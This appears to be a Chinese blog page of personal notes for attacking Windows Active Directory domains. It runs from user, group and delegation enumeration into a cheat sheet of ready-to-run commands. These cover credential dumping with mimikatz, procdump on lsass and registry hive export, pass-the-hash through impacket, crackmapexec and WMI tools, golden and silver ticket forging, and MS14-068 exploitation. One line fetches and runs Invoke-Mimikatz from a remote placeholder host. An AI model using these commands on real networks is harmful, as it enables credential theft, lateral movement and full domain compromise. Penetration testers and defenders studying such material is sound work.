<p>域用户全部属于成员用户，机器用户是以机器名后面加$来命名的。普通的域用户可以在域内任意一台机器上登录（默认情况下），所以域用户不能代表那台特定的机器；机器用户是该台域内机器的管理员权限用户，所以机器用户代表了那台特定的机器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="域管组有谁"><a href="#域管组有谁" class="headerlink" title="域管组有谁"></a>域管组有谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup administrators &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="企业管理员是谁"><a href="#企业管理员是谁" class="headerlink" title="企业管理员是谁"></a>企业管理员是谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="域有几个用户组"><a href="#域有几个用户组" class="headerlink" title="域有几个用户组"></a>域有几个用户组</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &#x2F;domain</span><br></pre></td></tr></table></figure>
<p>还可以用adfind，adfind有很多强大的命令，这个以后再研究整理吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc oudmp -dn</span><br></pre></td></tr></table></figure>
<h2 id="域密码策略是什么"><a href="#域密码策略是什么" class="headerlink" title="域密码策略是什么"></a>域密码策略是什么</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net accounts &#x2F;domain</span><br></pre></td></tr></table></figure>
<h2 id="域内机器用户有谁"><a href="#域内机器用户有谁" class="headerlink" title="域内机器用户有谁"></a>域内机器用户有谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
<p>还可用adfind，可以通过objectclass=Computer或者objectcategory=Computer查找域内的所有机器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -f &quot;(objectcategory&#x3D;computer)&quot; -dn</span><br></pre></td></tr></table></figure>
<h2 id="域内用户有谁"><a href="#域内用户有谁" class="headerlink" title="域内用户有谁"></a>域内用户有谁</h2><p>net user、net group这种带net的命令，全部是以smb服务的samr协议进行通信查询的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure>
<p>还可以用impacket的samrdump查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">samrdump.py exp.com&#x2F;cs:123456@10.0.2.5 -csv</span><br></pre></td></tr></table></figure>
<p>还可以用ldapsearch通过ldap协议查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -h 10.0.2.254 -D &quot;cs@exp.com&quot; -b &quot;DC&#x3D;exp,DC&#x3D;com&quot; -w &quot;Aa123123.&quot; &quot;(&amp;(objectCategory&#x3D;person)(objectClass&#x3D;user))&quot; </span><br></pre></td></tr></table></figure>
<p>还可以用adfind查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(objectCategory&#x3D;person)(objectClass&#x3D;user))&quot; -dn</span><br></pre></td></tr></table></figure>
<h2 id="域用户的登录名是什么"><a href="#域用户的登录名是什么" class="headerlink" title="域用户的登录名是什么"></a>域用户的登录名是什么</h2><p>域用户的字段有姓有名还有登录名，这几个是可以得设置不一样的，OU指定用户的组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;CN&#x3D;cs,OU&#x3D;ceshi,DC&#x3D;exp,DC&#x3D;com&quot; displayName UserPrincipalName sAMAccountName</span><br></pre></td></tr></table></figure>
<h2 id="域用户是否活跃"><a href="#域用户是否活跃" class="headerlink" title="域用户是否活跃"></a>域用户是否活跃</h2><p>这个是通过查找域用户相关的一些时间，例如创建时间、密码更改时间、上次登录时间来判定。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;CN&#x3D;cs,OU&#x3D;ceshi,DC&#x3D;exp,DC&#x3D;com&quot; whencreated pwdlastset lastlogon -tdcs</span><br></pre></td></tr></table></figure>
<h2 id="密码永不过期的域用户"><a href="#密码永不过期的域用户" class="headerlink" title="密码永不过期的域用户"></a>密码永不过期的域用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -f &quot;useraccountcontrol:AND:&#x3D;65536&quot; -bit -dn</span><br></pre></td></tr></table></figure>
<p>关于useraccountcontrol值的相关对应表参照文末</p>
<h2 id="域用户能够登录的主机"><a href="#域用户能够登录的主机" class="headerlink" title="域用户能够登录的主机"></a>域用户能够登录的主机</h2><p>这个是通过指定远程DC进行查询。如果查找没有结果，说明这个用户没有限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 10.0.2.254 -sc u:cs userWorkstations</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import-module .\PowerView.ps1</span><br><span class="line">Invoke-UserHunter -UserName AdministratorUser</span><br></pre></td></tr></table></figure>
<h2 id="域用户正在登陆的主机"><a href="#域用户正在登陆的主机" class="headerlink" title="域用户正在登陆的主机"></a>域用户正在登陆的主机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psloggedon.exe \\dc</span><br><span class="line">使用Powerview的Invoke-UserHunter</span><br><span class="line">PVEFindADUser.exe -current</span><br><span class="line">netsess \\dc</span><br></pre></td></tr></table></figure>
<p>Nmap的NSE脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：https:&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F;scripts&#x2F;smb-enum-sessions.html</span><br><span class="line">smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</span><br><span class="line">smb-enum-users.nse可以使用此脚本对域控进行扫描</span><br></pre></td></tr></table></figure>
<h2 id="约束委派用户"><a href="#约束委派用户" class="headerlink" title="约束委派用户"></a>约束委派用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; -dn</span><br><span class="line"></span><br><span class="line">AdFind.exe -f &quot;useraccountcontrol:AND:&#x3D;524288&quot; -bit -dn</span><br></pre></td></tr></table></figure>
<h2 id="约束委派主机"><a href="#约束委派主机" class="headerlink" title="约束委派主机"></a>约束委派主机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; -dn</span><br></pre></td></tr></table></figure>
<p>或者用PowerSploit的PowerView.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-DomainUser –TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</span><br></pre></td></tr></table></figure>
<h2 id="非约束委派用户"><a href="#非约束委派用户" class="headerlink" title="非约束委派用户"></a>非约束委派用户</h2><p>adfind</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br></pre></td></tr></table></figure>
<p>ldapsearch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;10.0.2.254:389 -D &quot;CN&#x3D;cs,CN&#x3D;Users,DC&#x3D;exp,DC&#x3D;com&quot; -w Aa123123. -b &quot;DC&#x3D;exp,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
<h2 id="非约束委派主机"><a href="#非约束委派主机" class="headerlink" title="非约束委派主机"></a>非约束委派主机</h2><p>adfind</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br></pre></td></tr></table></figure>
<p>ldapsearch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.141.145:389 -D &quot;CN&#x3D;qiyou,CN&#x3D;Users,DC&#x3D;qiyou,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;qiyou,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
<h1 id="Bypsss的信息搜集"><a href="#Bypsss的信息搜集" class="headerlink" title="Bypsss的信息搜集"></a>Bypsss的信息搜集</h1><h2 id="使用csvde"><a href="#使用csvde" class="headerlink" title="使用csvde"></a>使用csvde</h2><h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><p>导出当前域内所有信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -f all.csv</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有用户信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -f user.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot;</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有机器信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -f machine.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot;</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有组信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -f group.csv -r &quot;(&amp;(objectCategory&#x3D;group))&quot;</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有管理员组的用户信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -f admin.csv -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot;</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有OU信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -f ou.csv -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot;</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有的域用户名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -f username.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountName</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有的计算机名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -f machinename.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l name</span><br></pre></td></tr></table></figure>
<h3 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h3><p>导出远程域内所有信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csvde -s 192.168.1.1 -a test\admin Password -f all.csv</span><br></pre></td></tr></table></figure>
<h2 id="使用ldifde"><a href="#使用ldifde" class="headerlink" title="使用ldifde"></a>使用ldifde</h2><h3 id="本地-1"><a href="#本地-1" class="headerlink" title="本地"></a>本地</h3><p>导出当前域内所有信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -f all.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有用户信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -f user.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有机器信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -f machine.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有组信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -r &quot;(&amp;(objectCategory&#x3D;group))&quot; -f group.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有管理员组的用户信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot; -f admin.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有OU信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot; -f ou.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有的域用户名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountName -f username.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有的计算机名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l name -f machinename.txt</span><br></pre></td></tr></table></figure>
<h3 id="远程-1"><a href="#远程-1" class="headerlink" title="远程"></a>远程</h3><p>导出远程域内所有信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldifde -s 192.168.1.1 -a test\admin Password -f all.txt</span><br></pre></td></tr></table></figure>
<h2 id="使用AdFind"><a href="#使用AdFind" class="headerlink" title="使用AdFind"></a>使用AdFind</h2><h3 id="本地-2"><a href="#本地-2" class="headerlink" title="本地"></a>本地</h3><p>导出当前域内所有信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 127.0.0.1&gt;all.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有用户信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 127.0.0.1 -f objectcategory&#x3D;person&gt;user.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有机器信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 127.0.0.1 -f objectcategory&#x3D;computer&gt;machine.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有组信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 127.0.0.1 -f objectcategory&#x3D;group&gt;group.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有管理员组的用户信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 127.0.0.1 -f &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot;&gt;admin.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有OU信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 127.0.0.1 -f objectcategory&#x3D;organizationalUnit&gt;ou.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有的域用户名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 127.0.0.1 -f objectcategory&#x3D;person SamAccountName&gt;username.txt</span><br></pre></td></tr></table></figure>
<p>导出当前域内所有的计算机名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 127.0.0.1 -f objectcategory&#x3D;computer name&gt;machinename.txt</span><br></pre></td></tr></table></figure>
<h3 id="远程-2"><a href="#远程-2" class="headerlink" title="远程"></a>远程</h3><p>导出远程域内所有信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 192.168.1.1 -u test\admin -up Password&gt;all.txt</span><br></pre></td></tr></table></figure>
<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><h2 id="密码利用"><a href="#密码利用" class="headerlink" title="密码利用"></a>密码利用</h2><h3 id="读密码"><a href="#读密码" class="headerlink" title="读密码"></a>读密码</h3><h4 id="meterpreter方式"><a href="#meterpreter方式" class="headerlink" title="meterpreter方式"></a>meterpreter方式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv	#读的是hash</span><br><span class="line">meterpreter &gt; ssp	#读的是明文</span><br><span class="line">meterpreter &gt; wdigest #读的是明文</span><br></pre></td></tr></table></figure>
<h4 id="mimikatz方式"><a href="#mimikatz方式" class="headerlink" title="mimikatz方式"></a>mimikatz方式</h4><p>sekurlsa可用的还有msv、wdigest、kerberos、tspkg、ssp、logonPasswords、ekeys等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log 1.txt&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:test.com &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>
<p>还有PowerSploit的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xx&#x2F;xx&#39;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
<h4 id="procdump组合mimikatz"><a href="#procdump组合mimikatz" class="headerlink" title="procdump组合mimikatz"></a>procdump组合mimikatz</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
<h4 id="注册表导出本地读取"><a href="#注册表导出本地读取" class="headerlink" title="注册表导出本地读取"></a>注册表导出本地读取</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;lsadump::sam &#x2F;sam:sam.hive &#x2F;system:system.hive&quot; exit</span><br></pre></td></tr></table></figure>
<h3 id="PTH-amp-PTK"><a href="#PTH-amp-PTK" class="headerlink" title="PTH&amp;PTK"></a>PTH&amp;PTK</h3><p>PTH在kb2871997之后可能会失败。但可以使用机器用户或域用户绕过，机器用户就是域用户。</p>
<h4 id="impacket方式"><a href="#impacket方式" class="headerlink" title="impacket方式"></a>impacket方式</h4><p>这几个脚本的使用参数都是一样的，exe和py都是一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.py	动静一般</span><br><span class="line">psexec.py	动静大</span><br><span class="line">dcomexec.py	动静小	</span><br><span class="line">smbexec.py	动静大</span><br><span class="line">atexec.py </span><br></pre></td></tr></table></figure>
<p>有明文密码的情况下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py administrator:Aa123123.@10.0.2.254</span><br></pre></td></tr></table></figure>
<p>有hash的情况下</p>
<p>工作组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes b9466d8c3afe060325ad3b83fa6627c7:379529bb14c7cc48eb314445c3529f49 workgroup&#x2F;administrator@192.168.80.5</span><br></pre></td></tr></table></figure>
<p>域</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py exp&#x2F;administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c</span><br></pre></td></tr></table></figure>
<p>有ase256的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py exp&#x2F;administrator@10.0.2.5 -aesKey a38e70861856e2f4c98134b5288383c7992e63c5031a9540e636d2cafa9e88d6</span><br></pre></td></tr></table></figure>
<h4 id="mimikatz方式-1"><a href="#mimikatz方式-1" class="headerlink" title="mimikatz方式"></a>mimikatz方式</h4><p>ntlm可改为rc4、aes256、aes128</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:win10 &#x2F;domain:test.local &#x2F;ntlm:6a6293bc0c56d7b9731e2d5506065e4a</span><br></pre></td></tr></table></figure>
<h4 id="批量方式"><a href="#批量方式" class="headerlink" title="批量方式"></a>批量方式</h4><p>CS、crackmap都可以批量PTH，CS直接点点点就行了</p>
<h5 id="crackmap"><a href="#crackmap" class="headerlink" title="crackmap"></a>crackmap</h5><p>这个工具的思路作用是直接命令执行或传马</p>
<p>SMB服务探测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure>
<p>查看密码策略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --pass-pol</span><br></pre></td></tr></table></figure>
<p>hashdump</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --sam</span><br></pre></td></tr></table></figure>
<p>枚举组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --local-groups</span><br></pre></td></tr></table></figure>
<p>基于smbexec执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method smbexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<p>基于dcom执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method mmcexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<p>基于atexec执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method wmiexec -X &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<p>利用hash传递</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -H &#39;579110c49145015c47ecd267657d3174&#39; --exec-method atexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<p>上传文件</p>
<p>默认到C盘，源-目标</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --put-file 1.bin 32.bin</span><br></pre></td></tr></table></figure>
<p>查看电脑的盘符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --disks</span><br></pre></td></tr></table></figure>
<h5 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h5><p>Invoke-WMIexec<br>Invoke-SMBExec</p>
<p>命令格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行</span><br><span class="line">Invoke-WMIExec -Target 10.0.2.5 -Domain workgroup -Username uac -Hash 36aa83bdcab3c9fdaf321ca42a31c3fc -Command &quot;calc&quot; -verbose</span><br><span class="line">检查</span><br><span class="line">Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0</span><br></pre></td></tr></table></figure>
<h5 id="绕过Win32-Process-create的PTH"><a href="#绕过Win32-Process-create的PTH" class="headerlink" title="绕过Win32_Process.create的PTH"></a>绕过Win32_Process.create的PTH</h5><p>360LINTON写的vbs工具，无需445</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主要功能：1、命令执行；2、文件上传；3、文件下载</span><br><span class="line"></span><br><span class="line">有命令回显执行方式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</span><br><span class="line"></span><br><span class="line">无命令回显</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</span><br><span class="line"></span><br><span class="line">模拟shell模式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;shell 172.16.94.187 administrator &quot;Password!&quot;</span><br><span class="line"></span><br><span class="line">文件上传-复制本机calc.exe到远程主机c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe &#x2F;upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</span><br><span class="line"></span><br><span class="line">文件下载-下载远程主机calc.exe到本地c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe &#x2F;download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure>
<h5 id="使用wmi事件订阅的PTH"><a href="#使用wmi事件订阅的PTH" class="headerlink" title="使用wmi事件订阅的PTH"></a>使用wmi事件订阅的PTH</h5><p>lengyi写的工具</p>
<p>修改js文件中的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop&gt; New-WMIShell -Target &#39;192.168.2.115&#39; -Username &#39;administrator&#39; -Password &#39;abc123!&#39; -ProcessName &#39;notepad.exe&#39; -JScriptPath C:\Users\Administrator\Desktop\payload.js -FilterName &#39;sdqwsda&#39; -ConsumerName &#39;sdqwsda&#39;</span><br></pre></td></tr></table></figure>
<h4 id="使用hash登录RDP"><a href="#使用hash登录RDP" class="headerlink" title="使用hash登录RDP"></a>使用hash登录RDP</h4><p>win7测试失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:remoteserver &#x2F;ntlm:579110c49145015c47ecd267657d3174 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><h4 id="票据操作"><a href="#票据操作" class="headerlink" title="票据操作"></a>票据操作</h4><p>cmd方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd:&gt;klist 查看票据</span><br><span class="line">cmd:&gt;klist purge 删除票据</span><br></pre></td></tr></table></figure>
<p>mimikatz方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::purge         &#x2F;&#x2F;清空当前机器中所有凭证</span><br><span class="line">mimikatz # kerberos::list          &#x2F;&#x2F;查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptt 票据文件   &#x2F;&#x2F;将票据注入到内存中</span><br></pre></td></tr></table></figure>
<h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>制作黄金票据的基础是获取了krbtgt账户的hash。</p>
<p>通过各种办法导出krbtgt的hash，然后制作票据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">制作票据，可以指定&#x2F;rc4、aes256、aes128</span><br><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:exp.com &#x2F;sid:S-1-5-21-2245962460-1542597299-2684170513 &#x2F;krbtgt:92cdcc6a660c53a1be3d4080ad92efde &#x2F;ticket:admin.tck</span><br><span class="line">注入票据</span><br><span class="line">kerberos::&#x2F;ptt 1.tck</span><br></pre></td></tr></table></figure>
<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>白银票据使用机器账户的ntlm hash，使用cifs文件服务，仅能访问特定服务，不限于cifs文件服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;domain:test.local &#x2F;sid:S-1-5-21-514356739-3204155868-1239341419 &#x2F;target:dc.test.local &#x2F;service:cifs &#x2F;rc4:9150e40e4ec936a15baf384ca382a3df &#x2F;user:dc$ &#x2F;ptt</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>基于PAC产生的漏洞</p>
<h4 id="windows利用"><a href="#windows利用" class="headerlink" title="windows利用"></a>windows利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123.</span><br></pre></td></tr></table></figure>
<h4 id="Linux上利用"><a href="#Linux上利用" class="headerlink" title="Linux上利用"></a>Linux上利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.py -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123.</span><br></pre></td></tr></table></figure>
<p>生成票据后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass -debug -dc-ip 10.0.2.254 -target-ip 10.0.2.254</span><br></pre></td></tr></table></figure>
